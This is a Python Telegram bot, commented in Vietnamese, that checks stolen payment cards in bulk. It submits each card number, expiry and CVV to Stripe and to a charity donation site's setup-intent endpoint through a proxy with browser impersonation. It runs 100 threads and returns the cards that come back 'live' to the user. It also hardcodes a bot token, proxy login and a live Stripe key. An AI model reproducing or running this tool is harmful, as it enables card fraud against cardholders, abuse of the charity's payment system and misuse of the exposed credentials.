import telebot
import re
import time
import uuid
import threading
import os
import psutil
import datetime
from concurrent.futures import ThreadPoolExecutor
from curl_cffi import requests

# ==============================================================================
# CẤU HÌNH BOT & PROXY
# ==============================================================================
API_TOKEN = '8110946929:AAGFn8gap9gMHH4_pABitcNd-saTGl24g0I'  # <--- THAY TOKEN CỦA BẠN Ở ĐÂY
bot = telebot.TeleBot(API_TOKEN)

# Proxy Configuration (Hardcoded)
# Format gốc: IP:PORT:USER:PASS
# asg.360s5.com:3600:88634867-zone-custom:AetOKcLB
PROXY_STR = "http://88634867-zone-custom:AetOKcLB@asg.360s5.com:3600"
PROXIES_CONF = {"http": PROXY_STR, "https": PROXY_STR}

# Global Variables
MAX_WORKERS = 100  # Số luồng mặc định

# ==============================================================================
# PHẦN 1: HÀM HỖ TRỢ (GIỮ NGUYÊN TỪ CODE CŨ)
# ==============================================================================

def normalize_card(card_str):
    pattern = r'(\d{13,19})[|/:](\d{1,2})[|/:](\d{2,4})[|/:](\d{3,4})'
    match = re.search(pattern, card_str)
    if not match:
        return None
    card_num, month, year, cvv = match.groups()
    
    month_int = int(month)
    if month_int < 1 or month_int > 12:
        return None
    month = month.zfill(2)
    
    if len(year) == 2:
        year = '20' + year
    
    return f"{card_num}|{month}|{year}|{cvv}"

def validate_luhn(card_number):
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19:
        return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9:
                n = n - 9
        total += n
    return total % 10 == 0

def random_string(length=10):
    import string, random
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length)) + "@gmail.com"

# ==============================================================================
# PHẦN 2: XỬ LÝ CHÍNH (CORE LOGIC - GIỮ NGUYÊN)
# ==============================================================================

def check_card_core(cc, mes, ano, cvv):
    """
    Hàm xử lý logic check thẻ, trả về (status, message)
    Status: 'LIVE', 'DIE', 'ERROR'
    """
    import random # Import lại để đảm bảo thread safe
    
    proxies = PROXIES_CONF
    
    # === RETRY LOOP (Tối đa 20 lần - Giữ nguyên logic cũ) ===
    max_retries = 20
    messegner = ""
    status = "DIE" # Mặc định là DIE trừ khi Approved
    
    start_time = time.time() # Bắt đầu tính giờ xử lý logic

    for attempt in range(max_retries):
        try:
            session = requests.Session(
                impersonate="chrome124",
                proxies=proxies,
                timeout=30
            )
            
            url_const = "https://bubstrong.betterworld.org"
            email_random = random_string(10)

            # --- BƯỚC 1: REQUEST STRIPE ---
            stripe_url = "https://api.stripe.com/v1/payment_methods"
            
            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())
            
            stripe_payload = {
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_year]": ano,
                "card[exp_month]": mes,
                "allow_redisplay": "unspecified",
                "billing_details[address][postal_code]": "53227",
                "billing_details[address][country]": "US",
                "billing_details[address][line1]": "2830 Oakridge Farm Lane",
                "billing_details[address][city]": "West Allis",
                "billing_details[address][state]": "WI",
                "billing_details[name]": "Minh Nhat",
                "payment_user_agent": "stripe.js/f47b5e380c; stripe-js-v3/f47b5e380c; payment-element; deferred-intent; autopm",
                "referrer": url_const,
                "time_on_page": str(random.randint(45000, 120000)),
                "guid": guid,
                "muid": muid,
                "sid": sid,
                "key": "pk_live_aGE2zfplg4kOqYZ4QWKOM9ah"
            }

            headers_stripe = {
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/"
            }

            req1 = session.post(stripe_url, data=stripe_payload, headers=headers_stripe)
            json_stripe = req1.json()
            
            if "error" in json_stripe:
                err_code = json_stripe["error"].get("code", "")
                message = json_stripe['error'].get('message', '')
                messegner = f"Stripe Error: {message}"
                if err_code in ["invalid_cvc", "incorrect_number", "card_declined", "expired_card"]:
                    status = "DIE"
                    break 
                else:
                    raise Exception("Stripe Rate Limit or Unknown Error")

            pm_id = json_stripe.get("id")
            if not pm_id:
                raise Exception("Missing PM ID")

            # --- BƯỚC 2: GET TRANG DONATE ---
            donate_url = "https://bubstrong.betterworld.org/donate"
            headers_get = {
                "Referer": "https://bubstrong.betterworld.org/",
                "Upgrade-Insecure-Requests": "1"
            }

            req2 = session.get(donate_url, headers=headers_get)
            if req2.status_code != 200:
                raise Exception(f"Get Page Failed: {req2.status_code}")

            html_source = req2.text
            match_au = re.search(r'bwc&quot;:&quot;(.*?)&quot', html_source)
            match_token = re.search(r'<meta name="csrf-token" content="(.*?)"', html_source)
            
            if not match_au or not match_token:
                raise Exception("Missing Tokens")

            au_token = match_au.group(1)
            csrf_token = match_token.group(1)

            # --- BƯỚC 3: SETUP INTENTS ---
            setup_url = "https://api.betterworld.org/v1/user-payments/setup-intents"
            headers_bw = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://bubstrong.betterworld.org",
                "referer": "https://bubstrong.betterworld.org/",
                "x-auth-token": au_token,
                "x-bw-src": "l",
                "x-csrf-token": csrf_token,
                "x-requested-with": "XMLHttpRequest"
            }
            
            data_setup = {
                "email": email_random,
                "payment_method_type": "card",
                "is_widget": "0"
            }

            req3 = session.post(setup_url, data=data_setup, headers=headers_bw)
            json_setup = req3.json()
            
            if "data" in json_setup and "user_setup_intent_id" in json_setup["data"]:
                intent_id = json_setup["data"]["user_setup_intent_id"]
            else:
                raise Exception("Missing Intent ID")

            # --- BƯỚC 4: CONFIRM ---
            confirm_url = f"https://api.betterworld.org/v1/user-payments/setup-intents/{intent_id}/confirm"
            headers_bw["origin"] = url_const
            headers_bw["referer"] = url_const
            
            data_confirm = {
                "payment_method_type": "card",
                "stripe_payment_method_id": pm_id,
                "is_widget": "0"
            }

            req4 = session.post(confirm_url, data=data_confirm, headers=headers_bw)
            response_text = req4.text
            
            try:
                json_confirm = req4.json()
                error_desc = json_confirm.get("error_description", "")
            except:
                error_desc = ""

            if "user_payment_method_id" in response_text and req4.status_code in [200, 201]:
                messegner = "APPROVED V3✅"
                status = "LIVE"
            elif error_desc:
                messegner = f"[CUSTOM] {error_desc}"
                status = "DIE"
            elif "security code is incorrect" in response_text or "incorrect_cvc" in response_text:
                messegner = "CCN - Incorrect CVV"
                status = "DIE"
            elif "insufficient_funds" in response_text:
                messegner = "CVV - Insufficient Funds"
                status = "DIE"
            elif req4.status_code == 403:
                raise Exception("403 Forbidden")
            else:
                messegner = f"[DECLINED] {response_text[:50]}"
                status = "DIE"
            
            break

        except Exception as e:
            if attempt == max_retries - 1:
                messegner = f"ERROR - MAX RETRIES ({str(e)})"
                status = "ERROR"
            else:
                time.sleep(1)
                continue
    
    time_taken = round(time.time() - start_time, 2)
    return status, messegner, time_taken

# ==============================================================================
# PHẦN 3: BOT HANDLERS & MULTI-THREADING CONTROL
# ==============================================================================

# Biến lưu trạng thái tasks
tasks = {}

class TaskInfo:
    def __init__(self, chat_id, total):
        self.chat_id = chat_id
        self.total = total
        self.checked = 0
        self.live = 0
        self.die = 0
        self.error = 0
        self.start_time = time.time()
        self.is_running = True
        self.live_lines = []
        self.die_lines = []

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "🚀 *Bot Ready!*\n\n👉 Gửi file `.txt` (list thẻ) để check 100 luồng.\n👉 Dùng lệnh `/st cc|mm|yy|cvv` để check lẻ.", parse_mode="Markdown")

@bot.message_handler(commands=['st'])
def check_single_card(message):
    try:
        raw_data = message.text.replace("/st", "").strip()
        if not raw_data:
            bot.reply_to(message, "⚠️ Vui lòng nhập thông tin thẻ. Ví dụ: `/st 444444|12|25|123`", parse_mode="Markdown")
            return

        normalized = normalize_card(raw_data)
        if not normalized:
            bot.reply_to(message, "❌ Định dạng thẻ sai!", parse_mode="Markdown")
            return
        
        cc, mes, ano, cvv = normalized.split('|')
        
        if not validate_luhn(cc):
            bot.reply_to(message, f"❌ Luhn Check Failed: {cc}", parse_mode="Markdown")
            return

        msg = bot.reply_to(message, "⏳ Đang xử lý...", parse_mode="Markdown")
        
        # Chạy check
        status, result_msg, time_taken = check_card_core(cc, mes, ano, cvv)
        
        # Format kết quả trả về đúng yêu cầu
        full_result = f"{cc}|{mes}|{ano}|{cvv}|{result_msg}"
        
        icon = "✅" if status == "LIVE" else "❌"
        response = f"{icon} *{status}*\n`{full_result}`\n⏱ Time taken: {time_taken}s"
        
        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id, text=response, parse_mode="Markdown")

    except Exception as e:
        bot.reply_to(message, f"Lỗi: {e}")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Lưu tạm file
        temp_filename = f"check_{message.chat.id}_{int(time.time())}.txt"
        with open(temp_filename, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        # Đọc file
        with open(temp_filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
        
        total = len(lines)
        if total == 0:
            bot.reply_to(message, "❌ File rỗng!")
            os.remove(temp_filename)
            return

        # Khởi tạo Task
        task = TaskInfo(message.chat.id, total)
        tasks[message.chat.id] = task
        
        msg = bot.reply_to(message, f"⚡️ Đang khởi động check {total} thẻ với 100 luồng...", parse_mode="Markdown")
        
        # Bắt đầu luồng cập nhật trạng thái
        threading.Thread(target=status_updater, args=(message.chat.id, msg.message_id)).start()
        
        # Bắt đầu luồng xử lý chính
        threading.Thread(target=process_bulk, args=(message.chat.id, lines, temp_filename)).start()

    except Exception as e:
        bot.reply_to(message, f"Lỗi nhận file: {e}")

def get_system_usage():
    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory().percent
    return cpu, ram

def status_updater(chat_id, message_id):
    task = tasks.get(chat_id)
    if not task: return

    while task.is_running and task.checked < task.total:
        time.sleep(2) # Cập nhật mỗi 2s để tránh flood limit telegram
        try:
            elapsed = time.time() - task.start_time
            cpm = int((task.checked / elapsed) * 60) if elapsed > 0 else 0
            cpu, ram = get_system_usage()
            
            text = (
                f"⚡️ *Checking Status* ⚡️\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🔢 Total: `{task.total}`\n"
                f"✅ Live: `{task.live}`\n"
                f"❌ Die: `{task.die}`\n"
                f"⚠️ Error: `{task.error}`\n"
                f"🔄 Checked: `{task.checked}`\n"
                f"🚀 CPM: `{cpm}`\n"
                f"🖥 CPU: `{cpu}%` | RAM: `{ram}%`\n"
                f"━━━━━━━━━━━━━━━━━━"
            )
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode="Markdown")
        except Exception:
            pass # Bỏ qua lỗi nếu edit quá nhanh

def process_bulk(chat_id, lines, filename):
    task = tasks.get(chat_id)
    
    def worker(line):
        normalized = normalize_card(line)
        if not normalized:
            task.checked += 1 # Tính là đã check dù lỗi format
            return
            
        cc, mes, ano, cvv = normalized.split('|')
        
        if not validate_luhn(cc):
            task.checked += 1
            return

        status, result_msg, time_taken = check_card_core(cc, mes, ano, cvv)
        
        full_res = f"{cc}|{mes}|{ano}|{cvv}|{result_msg}|Time:{time_taken}s" # Format yêu cầu nhưng thêm time vào cuối log
        # Format string yêu cầu chính xác: result_string = f"{cc}|{mes}|{ano}|{cvv}|{messegner}"
        final_str = f"{cc}|{mes}|{ano}|{cvv}|{result_msg}"

        if status == "LIVE":
            task.live += 1
            task.live_lines.append(final_str)
        elif status == "DIE":
            task.die += 1
            task.die_lines.append(final_str)
        else:
            task.error += 1
        
        task.checked += 1

    # Chạy ThreadPool
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        executor.map(worker, lines)
    
    # Kết thúc
    task.is_running = False
    time.sleep(1) # Chờ updater chạy lần cuối
    
    # Gửi kết quả cuối cùng
    try:
        # Ghi file
        live_file = f"Live_{chat_id}.txt"
        die_file = f"Die_{chat_id}.txt"
        
        with open(live_file, "w", encoding="utf-8") as f:
            f.write("\n".join(task.live_lines))
            
        with open(die_file, "w", encoding="utf-8") as f:
            f.write("\n".join(task.die_lines))
        
        bot.send_message(chat_id, "✅ *Check Complete!* Sending files...", parse_mode="Markdown")
        
        if task.live > 0:
            with open(live_file, "rb") as f:
                bot.send_document(chat_id, f, caption=f"✅ Live Cards: {task.live}")
        
        with open(die_file, "rb") as f:
            bot.send_document(chat_id, f, caption=f"❌ Die Cards: {task.die}")
            
        # Dọn dẹp
        os.remove(live_file)
        os.remove(die_file)
        os.remove(filename)
        del tasks[chat_id]

    except Exception as e:
        bot.send_message(chat_id, f"Lỗi gửi file: {e}")

# ==============================================================================
# MAIN LOOP
# ==============================================================================
if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()
